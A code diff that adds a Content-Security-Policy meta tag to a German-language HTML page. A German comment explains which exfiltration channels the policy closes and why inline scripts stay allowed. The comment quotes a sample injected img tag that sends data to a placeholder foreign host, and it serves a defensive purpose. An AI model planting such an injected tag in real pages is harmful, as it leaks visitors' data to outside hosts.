@@ -2,6 +2,17 @@
 <html lang="de">
 <head>
 <meta charset="utf-8">
+<!-- Inhaltsrichtlinie (Sicherheits-Pass v3.112.0).
+     GitHub Pages kann keine Kopfzeilen setzen, also steht sie als meta-Angabe.
+     Das kostet `frame-ancestors` (nur als Kopfzeile wirksam) — der Rest gilt.
+
+     Was sie WIRKLICH abfaengt: `img-src`/`connect-src`/`form-action` schneiden
+     die Abflusswege ab. Ein eingeschleustes `<img src="https://fremd/?d=…">`
+     kommt damit nicht mehr aus der Seite heraus. `script-src` bleibt bei
+     'unsafe-inline' — die Seiten tragen ihr Skript inline, und ein Hash waere
+     bei jeder Textaenderung still falsch. Der eigentliche Schutz gegen
+     Einschleusung ist deshalb die Maskierung im Code, nicht diese Zeile. -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'none'; object-src 'none'; base-uri 'self'; form-action 'none'">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Stack &amp; Siege · Visual Review & AAA-Konzept</title>
 <style>
